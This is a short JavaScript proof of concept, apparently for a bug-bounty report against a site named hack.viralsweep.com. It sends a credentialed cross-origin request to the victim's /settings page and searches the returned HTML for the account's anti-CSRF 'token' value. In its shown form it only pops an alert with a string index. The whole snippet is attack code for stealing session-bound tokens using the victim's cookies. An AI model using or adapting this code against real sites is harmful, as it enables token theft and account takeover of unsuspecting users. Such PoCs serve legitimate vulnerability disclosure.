function damm(){
var http;

http = new XMLHttpRequest();
http.open("GET","https://hack.viralsweep.com/settings",true);
http.setRequestHeader('Content-Type','text/plain');
http.withCredentials = "true";
http.onreadystatechange = function(){
	if(http.responseText!="")
	{
		extractToken(http.responseText);
	}
	if(http.readystate == 4){
	}
}
http.send();
}
damm();
function extractToken(html)
{
	s = (html.indexOf('"token" value="'));
	t = (html.indexOf('" />\n\t<h4 class="serif">Account Information</h4>'));
	alert(t);
}
